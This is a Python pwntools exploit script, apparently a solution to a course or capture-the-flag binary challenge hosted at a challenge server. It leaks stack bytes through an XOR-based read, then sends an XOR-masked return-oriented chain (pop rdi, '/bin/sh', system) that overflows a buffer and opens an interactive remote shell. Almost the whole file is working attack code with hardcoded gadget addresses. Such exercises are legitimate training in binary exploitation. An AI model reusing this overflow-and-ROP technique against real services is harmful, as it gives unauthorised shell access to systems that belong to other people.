#!/usr/bin/env python3
from pwn import *

# exe = ELF("./easy")
exe = ELF("./medium")
# hard chall is dynamically linked, so here's helper
# patched version to load proper ld and libc
# exe = ELF("./hard_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")

context.binary = exe
index_number = b"438596"


def bxor(b1, b2):  # use xor for bytes
    result = b""
    for b1, b2 in zip(b1, b2):
        result += bytes([b1 ^ b2])
    return result


def send_config(r):
    r.sendline(index_number)
    r.sendline(b"2")


def send_init(r):
    r.sendline(b"8")
    r.sendline(8 * b"A")


def conn():
    # r = process([exe.path, index_number])
    r = remote("bsk.bonus.re", 13337)
    if args.GDB:
        gdb.attach(r)
    send_config(r)

    dl = 96
    send_init(r)
    r.sendline(str(dl + 1).encode())
    r.sendline(b"\0" * dl + b"\n")
    for _ in range(5 + 9):
        __ = r.recvline()
        # print(__.decode())
    recv = r.recvn(dl + 1)  # bytes for xor

    for _ in range(0, dl, 8):
        print(hex(u64(recv[_:_ + 8])))

    pop_rdi = 0x402326
    binsh = 0x4a014d
    system = 0x40189b

    send_init(r)
    r.sendline(b"96")
    payload = 72 * b"\0" + bxor(p64(pop_rdi) + p64(binsh) + p64(system), recv[72:96])
    r.sendline(payload)

    # for _ in range(5):
    #     __ = r.recvline()
    # recv = r.recvline()  # bytes for xor
    #
    # for _ in range(0, dl, 8):
    #     print(hex(u64(recv[_:_+8])))

    return r


def main():
    r = conn()
    # good luck!
    r.interactive()


if __name__ == "__main__":
    main()
